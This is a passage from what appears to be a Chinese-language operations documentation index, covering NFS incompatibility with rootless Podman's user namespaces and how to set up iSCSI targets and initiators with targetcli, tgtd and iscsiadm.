\u200b\u4e0e\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b (User Namespace) \u200b\u7684\u200b\u517c\u5bb9\u6027\u95ee\u9898\u200b</p> <p>\u200b\u5728\u200b\u5bb9\u5668\u200b\u5316\u200b\u73af\u5883\u200b\u4e2d\u200b\u4f7f\u7528\u200b NFS \u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u9047\u5230\u200b\u5176\u200b\u4e0e\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u76f8\u5173\u200b\u7684\u200b\u517c\u5bb9\u6027\u95ee\u9898\u200b\uff1a</p> <ul> <li>Rootless Podman \u200b\u4e0e\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff1aRootless Podman \u200b\u5229\u7528\u200b Linux \u200b\u7684\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u529f\u80fd\u200b\uff0c\u200b\u5c06\u200b\u5bb9\u5668\u200b\u5185\u90e8\u200b\u7684\u200b\u7528\u6237\u200b ID\uff08\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5bb9\u5668\u200b\u5185\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u5176\u200b UID \u200b\u4e3a\u200b 0\uff09\u200b\u6620\u5c04\u200b\u5230\u200b\u5bbf\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7279\u6743\u200b\u7528\u6237\u200b ID \u200b\u8303\u56f4\u200b\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u5bb9\u5668\u200b\u5185\u200b\u7684\u200b root \u200b\u7528\u6237\u200b\u5728\u200b\u5bbf\u4e3b\u673a\u200b\u4e0a\u200b\u5e76\u200b\u4e0d\u200b\u5177\u5907\u200b\u771f\u6b63\u200b\u7684\u200b root \u200b\u6743\u9650\u200b\u3002\u200b\u66f4\u200b\u591a\u200b\u8be6\u60c5\u200b\u8bf7\u53c2\u9605\u200b Understanding rootless Podman's user namespace modes\u3002</li> <li>NFS \u200b\u4e0e\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b\u4e0d\u200b\u517c\u5bb9\u6027\u200b\uff1aNFS \u200b\u534f\u8bae\u200b\u5728\u200b\u8bbe\u8ba1\u200b\u4e4b\u521d\u200b\u5e76\u672a\u200b\u5145\u5206\u8003\u8651\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002\u200b\u5176\u200b\u5de5\u4f5c\u200b\u673a\u5236\u200b\u9ad8\u5ea6\u200b\u4f9d\u8d56\u4e8e\u200b\u670d\u52a1\u5668\u200b\u4e0e\u200b\u5ba2\u6237\u7aef\u200b\u4e4b\u95f4\u200b\u5bf9\u200b UID \u200b\u548c\u200b GID \u200b\u7684\u200b\u4e00\u81f4\u6027\u200b\u8ba4\u77e5\u200b\u3002\u200b\u5f53\u200b\u5f15\u5165\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u540e\u200b\uff0c\u200b\u5bb9\u5668\u200b\u5185\u200b\u7684\u200b UID/GID \u200b\u4e0e\u200b\u5bbf\u4e3b\u673a\u200b\u4ee5\u53ca\u200b NFS \u200b\u670d\u52a1\u5668\u200b\u6240\u200b\u671f\u671b\u200b\u7684\u200b UID/GID \u200b\u53ef\u80fd\u200b\u4e0d\u518d\u200b\u4e00\u81f4\u200b\u3002</li> <li>\u200b\u5bfc\u81f4\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u5f53\u200b\u8fd0\u884c\u200b\u5728\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u5185\u200b\u7684\u200b\u5bb9\u5668\u200b\u5c1d\u8bd5\u200b\u5728\u200b NFS \u200b\u6302\u8f7d\u200b\u7684\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u6267\u884c\u200b\u6587\u4ef6\u200b\u6240\u6709\u6743\u200b\u53d8\u66f4\u200b\u64cd\u4f5c\u200b\uff08\u200b\u4f8b\u5982\u200b <code>chown</code>\u200b\u547d\u4ee4\u200b\uff09\uff0c\u200b\u5e76\u200b\u8bd5\u56fe\u200b\u5c06\u200b\u6587\u4ef6\u200b\u6240\u6709\u8005\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u4ec5\u200b\u5728\u200b\u8be5\u200b\u5bb9\u5668\u200b\u7684\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u5185\u200b\u6709\u6548\u200b\u7684\u200b UID \u200b\u65f6\u200b\uff0cNFS \u200b\u670d\u52a1\u5668\u200b\u901a\u5e38\u200b\u65e0\u6cd5\u200b\u8bc6\u522b\u200b\u6216\u200b\u6b63\u786e\u5904\u7406\u200b\u8fd9\u4e2a\u200b\u6765\u81ea\u200b\u7279\u5b9a\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u7684\u200b UID\u3002\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b NFS \u200b\u670d\u52a1\u5668\u200b\u671f\u671b\u200b\u7684\u200b\u662f\u200b\u5176\u200b\u81ea\u8eab\u200b\uff08\u200b\u6216\u200b\u5168\u5c40\u200b\uff09\u200b\u8ba4\u77e5\u200b\u8303\u56f4\u200b\u5185\u200b\u7684\u200b UID\u3002\u200b\u6b64\u7c7b\u200b\u64cd\u4f5c\u200b\u56e0\u6b64\u200b\u5e38\u5e38\u200b\u5931\u8d25\u200b\u3002\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u5c1d\u8bd5\u200b\u5c06\u200b Rootless Podman \u200b\u7684\u200b\u5b58\u50a8\u200b\u4f4d\u7f6e\u200b\u8bbe\u7f6e\u200b\u5728\u200b NFS \u200b\u6302\u8f7d\u200b\u7684\u200b\u76ee\u5f55\u200b\u4e0a\u200b\u65f6\u4f1a\u200b\u9047\u5230\u56f0\u96be\u200b\uff0c\u200b\u5982\u200b Rootless Podman and NFS \u200b\u4e2d\u200b\u6240\u8ff0\u200b\u3002</li> <li> <p>Workaround: \u200b\u4f7f\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b NFS \u200b\u670d\u52a1\u5668\u200b\uff08\u200b\u5982\u200b <code>nfs-ganesha</code>\uff09\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e00\u5b9a\u200b\u7a0b\u5ea6\u200b\u4e0a\u200b\u7f13\u89e3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u66f4\u200b\u7075\u6d3b\u200b\u5730\u88ab\u200b\u4fee\u6539\u200b\u3002\u200b\u867d\u7136\u200b <code>nfs-ganesha</code> \u200b\u672c\u8eab\u200b\u5e76\u200b\u4e0d\u200b\u652f\u6301\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u5e94\u7528\u200b \u200b\u8fd9\u4e2a\u200b Patch \u200b\u6765\u200b\u4f7f\u200b\u5176\u200b\u652f\u6301\u200b\u7528\u6237\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u3002\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u53ef\u80fd\u200b\u4e0d\u591f\u200b\u5b89\u5168\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u8c28\u614e\u200b\u4f7f\u7528\u200b\u3002\u200b\u8fd9\u4e2a\u200b patch \u200b\u57fa\u4e8e\u200b\u7684\u200b\u5047\u8bbe\u200b\u662f\u200b NFS \u200b\u670d\u52a1\u7aef\u200b\u7684\u200b <code>/etc/subuid</code> \u200b\u548c\u200b <code>/etc/subgid</code> \u200b\u4e0e\u200b NFS \u200b\u5ba2\u6237\u7aef\u200b\u4e0a\u200b\u7684\u200b <code>/etc/subuid</code> \u200b\u548c\u200b <code>/etc/subgid</code> \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u81f3\u5c11\u200b\u662f\u200b\u60f3\u8981\u200b\u5904\u7406\u200b\u7684\u200b\u7528\u6237\u200b\u5bf9\u5e94\u200b\u7684\u200b subuid/subgid \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u6240\u4ee5\u200b\u5e76\u4e0d\u9700\u8981\u200b NFS \u200b\u5ba2\u6237\u7aef\u200b\u505a\u51fa\u200b\u6539\u52a8\u200b\u3002\u200b\u5728\u200b\u670d\u52a1\u7aef\u200b\u4fee\u6539\u200b\u4e3a\u200b nfs-ganesha \u200b\u7684\u200b\u5b9e\u73b0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e4b\u524d\u200b\u4f7f\u7528\u200b Kernel NFS Server \u200b\u63d0\u4f9b\u200b\u7684\u200b\u6302\u8f7d\u200b\u76ee\u5f55\u200b\u9700\u8981\u200b\u91cd\u65b0\u200b\u6302\u8f7d\u200b\u3002\u200b\u56e0\u4e3a\u200b Kernel NFS \u200b\u7684\u200b knfsd_fh \u200b\u4e0e\u200b ganesha \u200b\u7684\u200b <code>nfs_fh4</code> \u200b\u4e0d\u200b\u517c\u5bb9\u200b\u3002</p> <p><code>nfs-ganesha</code> \u200b\u671f\u671b\u200b <code>fh_version</code> \u200b\u4e3a\u200b <code>GANESHA_FH_VERSION</code>\uff1a</p> <pre><code>} else if (pfile_handle-&gt;fhversion !=\n            GANESHA_FH_VERSION) {\n            LogInfo(COMPONENT_FILEHANDLE,\n                \"INVALID HANDLE: not a Ganesha handle, fhversion=%d\",\n                pfile_handle-&gt;fhversion);\n</code></pre> <p>\u200b\u5176\u200b\u5b9a\u4e49\u200b\u662f\u200b\uff1a</p> <pre><code>#define GANESHA_FH_VERSION 0x43\n</code></pre> <p>\u200b\u800c\u200b Kernel NFS Server \u200b\u7684\u200b <code>knfsd_fh</code> \u200b\u7ed3\u6784\u200b\u4f53\u4e2d\u200b <code>fh_version</code> \u200b\u7684\u200b\u503c\u200b\u4e3a\u200b 1\uff0c\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u4e0d\u200b\u517c\u5bb9\u200b\u3002</p> </li> </ul>"},{"location":"ops/storage/network/#iscsi","title":"iSCSI","text":"<p>iSCSI \u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u5757\u200b\u8bbe\u5907\u200b\u7ea7\u522b\u200b\u7684\u200b\u7f51\u7edc\u200b\u5b58\u50a8\u200b\u3002\u200b\u5176\u4e2d\u200b\u670d\u52a1\u7aef\u200b\u79f0\u4e3a\u200b iSCSI Target\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u79f0\u4e3a\u200b iSCSI Initiator\u3002</p> <p>SCSI \u200b\u7684\u200b\u6982\u5ff5\u200b</p> <p>\u200b\u5728\u200b\u9605\u8bfb\u200b\u4e0b\u8ff0\u200b\u5185\u5bb9\u200b\u4e4b\u524d\u200b\uff0c\u200b\u7406\u6e05\u200b\u4e00\u4e9b\u200b SCSI \u200b\u534f\u8bae\u200b\uff08\u200b\u4e0d\u200b\u9650\u4e8e\u200b iSCSI\uff09\u200b\u7684\u200b\u6982\u5ff5\u200b\u4f1a\u200b\u6709\u6240\u200b\u5e2e\u52a9\u200b\uff1a</p> Initiator <p>\u200b\u53d1\u8d77\u200b I/O \u200b\u8bf7\u6c42\u200b\u7684\u200b\u3001\u200b\u9700\u8981\u200b\u8bfb\u53d6\u200b\u6216\u8005\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u4e00\u65b9\u200b\uff08\u200b\u4e3b\u673a\u200b/\u200b\u5ba2\u6237\u7aef\u200b\uff09</p> Target <p>\u200b\u54cd\u5e94\u200b I/O \u200b\u8bf7\u6c42\u200b\u7684\u200b\u3001\u200b\u63d0\u4f9b\u200b\u5b9e\u9645\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7684\u200b\u4e00\u65b9\u200b\uff08\u200b\u78c1\u76d8\u200b/\u200b\u9635\u5217\u200b/\u200b\u5b58\u50a8\u200b\u670d\u52a1\u5668\u200b\uff09</p> Logical Unit (LU) <p>Target \u200b\u5185\u90e8\u200b\u7684\u200b\u903b\u8f91\u200b\u5355\u5143\u200b\uff08\u200b\u5206\u533a\u200b/\u200b\u5377\u200b\uff09</p> Logical Unit Number (LUN) <p>\u200b\u6807\u8bb0\u200b Logical Unit \u200b\u7684\u200b\u7f16\u53f7\u200b</p>"},{"location":"ops/storage/network/#iscsi-server-targetcli","title":"\u670d\u52a1\u7aef\u200b\u914d\u7f6e\u200b\uff08targetcli/LIO \u200b\u65b9\u6848\u200b\uff09","text":"<p>Linux \u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u7684\u200b iSCSI Target \u200b\u5b9e\u73b0\u200b\u662f\u200b LIO\uff08LinuxIO\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5b89\u88c5\u200b <code>targetcli-fb</code> \u200b\u5305\u540e\u200b\u4f7f\u7528\u200b <code>targetcli</code> \u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\u3002\u200b\u5bf9\u5e94\u200b\u670d\u52a1\u200b\u662f\u200b <code>targetclid.service</code>\u3002</p> <pre><code>$ sudo targetcli\ntargetcli shell version 2.1.53\nCopyright 2011-2013 by Datera, Inc and others.\nFor help on commands, type 'help'.\n\n/&gt; ls\no- / ..................................................................... [...]\n  o- backstores .......................................................... [...]\n  | o- block .............................................. [Storage Objects: 0]\n  | o- fileio ............................................. [Storage Objects: 0]\n  | o- pscsi .............................................. [Storage Objects: 0]\n  | o- ramdisk ............................................ [Storage Objects: 0]\n  o- iscsi ........................................................ [Targets: 0]\n  o- loopback ..................................................... [Targets: 0]\n  o- vhost ........................................................ [Targets: 0]\n  o- xen-pvscsi ................................................... [Targets: 0]\n/&gt; cd iscsi\n/iscsi&gt; ls\no- iscsi .......................................................... [Targets: 0]\n/iscsi&gt;\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0ctarget \u200b\u4e0e\u5176\u200b\u76f8\u5173\u200b\u7684\u200b backstore\uff08\u200b\u5b9e\u9645\u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\u7684\u200b\u5730\u65b9\u200b\uff09\u200b\u90fd\u200b\u4ee5\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u6811\u72b6\u200b\u7ed3\u6784\u200b\u5c55\u793a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>cd</code> \u200b\u548c\u200b <code>ls</code> \u200b\u8fdb\u884c\u200b\u5bfc\u822a\u200b\u3002 \u200b\u4e3a\u4e86\u200b\u521b\u5efa\u200b iSCSI target\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u4e3a\u200b\u5176\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b backstore\u3002\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u65b9\u5f0f\u200b\u662f\u200b\u4f7f\u7528\u200b <code>fileio</code> \u200b\u5c06\u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b backstore\uff1a</p> <pre><code>/iscsi&gt; cd ..\n/&gt; backstores/fileio create test1 /tmp/test1.img 1G\nCreated fileio test1 with size 1073741824\n/&gt; ls backstores/fileio\no- fileio ................................................. [Storage Objects: 1]\n  o- test1 .................... [/tmp/test1.img (1.0GiB) write-back deactivated]\n    o- alua ................................................... [ALUA Groups: 1]\n      o- default_tg_pt_gp ....................... [ALUA state: Active/optimized]\n</code></pre> <p>\u200b\u548c\u200b\u521b\u5efa\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u6709\u4e9b\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u91cc\u200b\u7684\u200b\u6587\u4ef6\u200b\u662f\u200b\u4e13\u95e8\u200b\u4f5c\u4e3a\u200b iSCSI target\uff08\u200b\u6216\u8005\u200b\u522b\u7684\u200b target\uff09\u200b\u7684\u200b backstore \u200b\u800c\u200b\u5b58\u5728\u200b\u7684\u200b\u3002 \u200b\u5c06\u5757\u200b\u8bbe\u5907\u200b\u4f5c\u4e3a\u200b backstore \u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\uff1a</p> <pre><code>/&gt; backstores/block create test2 /dev/loop0\nCreated block storage object test2 using /dev/loop0\n/&gt; ls backstores/\no- backstores ............................................................ [...]\n  o- block ................................................ [Storage Objects: 1]\n  | o- test2 ...................... [/dev/loop0 (1.0GiB) write-thru deactivated]\n  |   o- alua ................................................. [ALUA Groups: 1]\n  |     o- default_tg_pt_gp ..................... [ALUA state: Active/optimized]\n  o- fileio ............................................... [Storage Objects: 1]\n  | o- test1 .................. [/tmp/test1.img (1.0GiB) write-back deactivated]\n  |   o- alua ................................................. [ALUA Groups: 1]\n  |     o- default_tg_pt_gp ..................... [ALUA state: Active/optimized]\n  o- pscsi ................................................ [Storage Objects: 0]\n  o- ramdisk .............................................. [Storage Objects: 0]\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u521b\u5efa\u200b iSCSI target\u3002\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u4e3a\u200b\u8fd9\u4e2a\u200b target\u300c\u200b\u8d77\u200b\u4e00\u4e2a\u200b\u540d\u5b57\u200b\u300d\uff0c\u200b\u8fd9\u4e2a\u200b\u540d\u5b57\u200b\u88ab\u200b\u79f0\u4e3a\u200b iqn\uff08iSCSI Qualified Name\uff09\u3002 iqn \u200b\u7684\u200b\u683c\u5f0f\u200b\u5f62\u200b\u5982\u200b <code>iqn.yyyy-mm.com.example:some-storage-target</code>\uff0c\u200b\u5176\u4e2d\u200b <code>yyyy-mm</code> \u200b\u662f\u200b\u65e5\u671f\u200b\uff0c<code>com.example</code> \u200b\u662f\u200b\u53cd\u8fc7\u6765\u200b\u7684\u200b\u57df\u540d\u200b\uff08reversed domain name\uff09\uff0c\u200b\u800c\u200b <code>:</code> \u200b\u540e\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u662f\u200b target \u200b\u7684\u200b\u540d\u5b57\u200b\u3002\u200b\u670d\u52a1\u5668\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b iqn\u3002</p> <pre><code>/&gt; iscsi/ create iqn.2024-03.org.example.201:test-target\nCreated target iqn.2024-03.org.example.201:test-target.\nCreated TPG 1.\nGlobal pref auto_add_default_portal=true\nCreated default portal listening on all IPs (0.0.0.0), port 3260.\n/&gt; ls iscsi/\no- iscsi .......................................................... [Targets: 1]\n  o- iqn.2024-03.org.example.201:test-target ......................... [TPGs: 1]\n    o- tpg1 ............................................. [no-gen-acls, no-auth]\n      o- acls ........................................................ [ACLs: 0]\n      o- luns ........................................................ [LUNs: 0]\n      o- portals .................................................. [Portals: 1]\n        o- 0.0.0.0:3260 ................................................... [OK]\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u5728\u200b <code>luns</code> \u200b\u4e0b\u200b\u7ed1\u5b9a\u200b backstore \u200b\u5230\u200b target \u200b\u4e0a\u200b\u3002LUN\uff08Logical Unit Number\uff09\u200b\u662f\u200b SCSI \u200b\u534f\u8bae\u200b\u4e2d\u200b\u6807\u8bb0\u200b\uff08\u200b\u903b\u8f91\u200b\uff09\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7684\u200b\u7f16\u53f7\u200b\u3002\u200b\u903b\u8f91\u200b\u5355\u5143\u200b\uff08Logical Unit\uff09\u200b\u662f\u200b SCSI \u200b\u534f\u8bae\u200b\u4e2d\u200b\u5bf9\u200b\u5177\u4f53\u200b\u7684\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u7684\u200b\u62bd\u8c61\u200b\u3002</p> <pre><code>/&gt; iscsi/iqn.2024-03.org.example.201:test-target/tpg1/luns create /backstores/fileio/test1\nCreated LUN 0.\n/&gt; ls iscsi/\no- iscsi .......................................................... [Targets: 1]\n  o- iqn.2024-03.org.example.201:test-target ......................... [TPGs: 1]\n    o- tpg1 ............................................. [no-gen-acls, no-auth]\n      o- acls ........................................................ [ACLs: 0]\n      o- luns ........................................................ [LUNs: 1]\n      | o- lun0 ............. [fileio/test1 (/tmp/test1.img) (default_tg_pt_gp)]\n      o- portals .................................................. [Portals: 1]\n        o- 0.0.0.0:3260 ................................................... [OK]\n</code></pre> <p>\u200b\u4e00\u4e2a\u200b\u5728\u200b\u6240\u6709\u200b\u5730\u5740\u200b\u7684\u200b 3260 \u200b\u7aef\u53e3\u200b\u76d1\u542c\u200b\u7684\u200b iSCSI target \u200b\u5c31\u200b\u521b\u5efa\u200b\u597d\u200b\u4e86\u200b\u3002 <code>portals</code> \u200b\u53ef\u4ee5\u200b\u9650\u5236\u200b\u8fde\u63a5\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\uff0c\u200b\u5982\u200b\u6709\u200b\u9700\u8981\u200b\u53ef\u200b\u81ea\u884c\u200b\u67e5\u8be2\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b portal</p> <p>\u200b\u4e00\u4e9b\u200b SAN \u200b\u65b9\u6848\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u591a\u4e2a\u200b portal\uff0c\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u7f51\u53e3\u200b\u3002\u200b\u5728\u200b\u96c6\u7fa4\u200b\u573a\u666f\u200b\u4e0b\u200b\u8ba9\u200b\u4e0d\u540c\u200b\u7684\u200b\u8282\u70b9\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b portal\uff0c\u200b\u4ee5\u6b64\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5b9e\u9645\u200b\u767b\u5f55\u200b\uff08\u200b\u8bf8\u5982\u200b\u6309\u7167\u200b\u4e0b\u9762\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u914d\u7f6e\u200b\uff09\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u5c06\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b iqn \u200b\u4e5f\u200b\u8bb0\u5f55\u200b\u5728\u200b <code>acls</code> \u200b\u4e2d\u200b\uff1a</p> <pre><code>/&gt; iscsi/iqn.2024-03.org.example.201:test-target/tpg1/acls create iqn.1993-08.org.debian:01:a6a4d4f7356f\nCreated Node ACL for iqn.1993-08.org.debian:01:a6a4d4f7356f\nCreated mapped LUN 0.\n</code></pre>"},{"location":"ops/storage/network/#iscsi-server-tgtd","title":"\u670d\u52a1\u7aef\u200b\u914d\u7f6e\u200b\uff08tgtd \u200b\u65b9\u6848\u200b\uff09","text":"<p>tgtd \u200b\u65b9\u6848\u200b\u4e3a\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b iSCSI target\uff0c\u200b\u5b89\u88c5\u200b <code>tgt</code> \u200b\u5305\u540e\u200b\u5373\u53ef\u200b\u5f00\u59cb\u200b\u914d\u7f6e\u200b\u3002\u200b\u5bf9\u5e94\u200b\u670d\u52a1\u200b\u662f\u200b <code>tgt.service</code>\u3002\u200b\u76f8\u6bd4\u200b\u4e8e\u200b targetcli\uff0ctgtd \u200b\u7684\u200b\u4f7f\u7528\u200b\u7b80\u5355\u200b\u4e00\u4e9b\u200b\u3002</p> <p>\u200b\u4e0e\u200b targetcli \u200b\u7c7b\u4f3c\u200b\uff0ctgtd \u200b\u7684\u200b target \u200b\u548c\u200b\u5b9e\u9645\u200b\u7684\u200b\u5b58\u50a8\u200b\u4e5f\u200b\u662f\u200b\u5206\u79bb\u200b\u7684\u200b\uff0c\u200b\u9996\u5148\u200b\u8ba9\u200b\u6211\u4eec\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b target\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b tid \u200b\u662f\u200b target id\u3002</p> <pre><code>sudo tgtadm --lld iscsi --op new --mode target --tid 1 -T iqn.2025-05.org.example.201:test-target\n</code></pre> <p>\u200b\u7136\u540e\u200b\u4e3a\u200b\u8fd9\u4e2a\u200b target \u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b logical unit\u2014\u2014\u200b\u8fd9\u91cc\u200b\u662f\u200b\u8bbe\u7f6e\u200b\u5b9e\u9645\u200b\u7684\u200b\u300c\u200b\u540e\u5907\u200b\u5b58\u50a8\u200b\u300d\u200b\u7684\u200b\u5730\u65b9\u200b\u3002<code>--backing-store</code> \u200b\u53ef\u4ee5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5757\u200b\u8bbe\u5907\u200b\u6216\u8005\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u3002</p> <pre><code>sudo tgtadm --lld iscsi --mode logicalunit --op new --tid 1 --lun 1 --backing-store /dev/loop0\n</code></pre> <p>tgtd \u200b\u62a5\u544a\u200b\u9519\u8bef\u200b\uff1f</p> <p>\u200b\u540e\u5907\u200b\u5b58\u50a8\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b tgtd \u200b\u80fd\u591f\u200b\u8bbf\u95ee\u200b\u5230\u200b\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u62a5\u544a\u200b\u6ca1\u6709\u200b\u4ec0\u4e48\u200b\u4fe1\u606f\u91cf\u200b\u7684\u200b <code>tgtadm: invalid request</code> \u200b\u9519\u8bef\u200b\u3002</p> <p>\u200b\u4e4b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u5141\u8bb8\u200b\u5bf9\u200b\u6307\u5b9a\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u670d\u52a1\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u88ab\u200b\u79f0\u4e3a\u200b <code>bind</code>\u3002</p> <pre><code>sudo tgtadm --lld iscsi --mode target --op bind --tid 1 --initiator-address ALL\n</code></pre> <p><code>op</code> \u200b\u4fee\u6539\u200b\u4e3a\u200b <code>unbind</code> \u200b\u5219\u200b\u662f\u200b\u5220\u9664\u200b\u5bf9\u200b\u6307\u5b9a\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u6743\u9650\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5728\u200b <code>target</code> \u200b\u6a21\u5f0f\u200b\u4e0b\u200b <code>show</code> \u200b\u5373\u53ef\u200b\uff1a</p> <pre><code>sudo tgtadm --lld iscsi --mode target --op show\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>tgtadm</code> \u200b\u914d\u7f6e\u200b\u7684\u200b iSCSI target \u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u914d\u7f6e\u200b\u6301\u4e45\u200b\u5316\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5728\u200b\u91cd\u542f\u200b\u540e\u200b\u81ea\u52a8\u200b\u52a0\u8f7d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c<code>tgt.service</code> \u200b\u542f\u52a8\u200b\u65f6\u200b\uff0c<code>tgt-admin</code> \u200b\u4f1a\u200b\u8bfb\u53d6\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u8fd8\u539f\u200b\u914d\u7f6e\u200b\u3002\u200b\u9996\u5148\u200b\u5bfc\u51fa\u200b\u5f53\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>$ sudo tgt-admin --dump\ndefault-driver iscsi\n\n&lt;target iqn.2025-05.org.example.201:test-target&gt;\n    backing-store /tmp/test.img\n&lt;/target&gt;\n</code></pre> <p>\u200b\u628a\u200b\u8f93\u51fa\u200b\u653e\u5230\u200b <code>/etc/tgt/conf.d/example.conf</code> \u200b\u4e2d\u200b\u5373\u53ef\u200b\u3002\u200b\u53ef\u4ee5\u200b\u91cd\u542f\u200b\u670d\u52a1\u200b\u9a8c\u8bc1\u200b\u662f\u5426\u200b\u751f\u6548\u200b\u3002</p>"},{"location":"ops/storage/network/#iscsi-client","title":"\u5ba2\u6237\u7aef\u200b\u914d\u7f6e","text":"<p>\u200b\u4f7f\u7528\u200b <code>iscsiadm</code> \u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b iSCSI initiator\uff08\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>open-iscsi</code>\uff09\u3002 \u200b\u64cd\u4f5c\u200b\u7684\u200b\u7b2c\u4e00\u6b65\u200b\u662f\u200b\u300c\u200b\u53d1\u73b0\u200b\u300diSCSI target\uff1a</p> <pre><code>$ sudo iscsiadm -m discovery -t sendtargets --portal 127.0.0.1\n127.0.0.1:3260,1 iqn.2024-03.org.example.201:test-target\n$ sudo iscsiadm -m node  # 